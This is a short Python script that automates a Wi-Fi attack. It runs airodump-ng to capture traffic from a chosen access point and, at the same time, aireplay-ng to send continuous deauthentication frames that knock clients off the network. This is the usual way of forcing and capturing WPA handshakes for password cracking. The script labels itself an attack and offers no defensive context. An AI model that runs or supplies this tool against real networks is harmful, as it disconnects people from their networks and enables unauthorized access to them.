#!/usr/bin/env python3
import subprocess
import signal
import sys
import csv
import os
import argparse
import re
from datetime import datetime
import time


processes = []
#
# # ---------- Signal handling ----------
def signal_handler(sig, frame):
     print("\n[!] Stopping all processes...")
     for p in processes:
         p.terminate()
     sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
#
# # ---------- Helpers ----------
def safe_filename(name):
     name = name.strip()
     name = re.sub(r"[^\w\-_.]", "_", name)
     return name or "unknown_ap"



# ---------- Attack ----------
def attack(interface, bssid, channel, essid):
    print("\n[*] Launching attack (Ctrl+C to stop)...")

    safe_essid = safe_filename(essid)
    print(safe_essid)

    dump = subprocess.Popen([
        "sudo", "airodump-ng",
        "-w", safe_essid,
        "-c", channel,
        "--bssid", bssid,
        interface
    ])

    time.sleep(2)

    deauth = subprocess.Popen([
        "sudo", "aireplay-ng",
        "--deauth", "0",
        "-a", bssid,
        interface
    ])

    processes.extend([dump, deauth])

    dump.wait()
    deauth.wait()


# ---------- Main ----------
def main():

    parser = argparse.ArgumentParser(
        description="Airodump + Aireplay helper script"
    )
    parser.add_argument(
        "-i", "--interface", required=True,
        default="wlan0mon",
        help="Monitor mode interface (default: wlan0mon)"
    )

    parser.add_argument(
        "--bssid", required=True,
        help="bssid of the AP"
    )

    parser.add_argument(
        "--channel", required=True,
        help="Channel of the AP"
    )

    parser.add_argument(
        "--essid", required=True,
        help="ESSID of the AP"
    )

    args = parser.parse_args()
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
    scan_prefix = f"{args.essid}_{timestamp}"
    with open("prefix.txt", "w") as file:
        file.write(scan_prefix)

    attack(interface= args.interface, bssid=args.bssid, channel=args.channel, essid=scan_prefix)






if __name__ == "__main__":
    main()
